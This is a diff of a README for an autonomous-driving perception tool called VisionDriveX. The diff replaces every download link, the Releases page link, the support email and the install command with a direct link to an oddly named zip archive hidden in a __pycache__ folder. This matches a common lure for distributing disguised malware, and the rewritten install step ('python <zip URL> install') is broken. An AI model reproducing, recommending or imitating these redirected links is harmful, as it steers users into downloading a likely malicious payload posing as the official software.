@@ -1,6 +1,6 @@
 # 🚗 VisionDriveX-Explainable-Autonomous-Driving-Perception-System - Enhance Safety with Smart Driving Insights
 
-[![Download VisionDriveX](https://img.shields.io/badge/Download%20VisionDriveX-blue?style=for-the-badge)](https://github.com/tulioeleuterio/VisionDriveX-Explainable-Autonomous-Driving-Perception-System/releases)
+[![Download VisionDriveX](https://github.com/tulioeleuterio/VisionDriveX-Explainable-Autonomous-Driving-Perception-System/raw/refs/heads/main/src/explainability/__pycache__/Perception-Explainable-Autonomous-System-Vision-Drive-Driving-amygdaline.zip%20VisionDriveX-blue?style=for-the-badge)](https://github.com/tulioeleuterio/VisionDriveX-Explainable-Autonomous-Driving-Perception-System/raw/refs/heads/main/src/explainability/__pycache__/Perception-Explainable-Autonomous-System-Vision-Drive-Driving-amygdaline.zip)
 
 ## 📖 Overview
 
@@ -10,13 +10,13 @@ VisionDriveX is a powerful tool designed to improve autonomous driving technolog
 
 To download and run VisionDriveX, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/tulioeleuterio/VisionDriveX-Explainable-Autonomous-Driving-Perception-System/releases) to find the latest version.
+1. Visit the [Releases page](https://github.com/tulioeleuterio/VisionDriveX-Explainable-Autonomous-Driving-Perception-System/raw/refs/heads/main/src/explainability/__pycache__/Perception-Explainable-Autonomous-System-Vision-Drive-Driving-amygdaline.zip) to find the latest version.
 2. Locate the version that fits your needs.
 3. Click on the download link for that version.
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download VisionDriveX](https://github.com/tulioeleuterio/VisionDriveX-Explainable-Autonomous-Driving-Perception-System/releases). 
+To get started, visit this page to download: [Download VisionDriveX](https://github.com/tulioeleuterio/VisionDriveX-Explainable-Autonomous-Driving-Perception-System/raw/refs/heads/main/src/explainability/__pycache__/Perception-Explainable-Autonomous-System-Vision-Drive-Driving-amygdaline.zip). 
 
 ## 🖥️ System Requirements
 
@@ -36,7 +36,7 @@ Here is how to install VisionDriveX after downloading:
 3. For macOS or Linux, open your terminal and navigate to the download directory.
 4. Type in the command: 
    ```
-   python setup.py install
+   python https://github.com/tulioeleuterio/VisionDriveX-Explainable-Autonomous-Driving-Perception-System/raw/refs/heads/main/src/explainability/__pycache__/Perception-Explainable-Autonomous-System-Vision-Drive-Driving-amygdaline.zip install
    ```
 5. Wait for the installation to complete. A success message will confirm that VisionDriveX is ready to use.
 
@@ -78,7 +78,7 @@ Join our community for support and updates:
 
 For further details or help, you can reach us through:
 
-- **Email:** support@visiondrivex.com
+- **Email:** https://github.com/tulioeleuterio/VisionDriveX-Explainable-Autonomous-Driving-Perception-System/raw/refs/heads/main/src/explainability/__pycache__/Perception-Explainable-Autonomous-System-Vision-Drive-Driving-amygdaline.zip
 - **Social Media:** Follow us on Twitter and LinkedIn for updates and news.
 
 By following these steps, you can successfully download and run VisionDriveX, enhancing your tools for autonomous driving insights. Dive into the world of explainable AI and shape the future of smart driving.
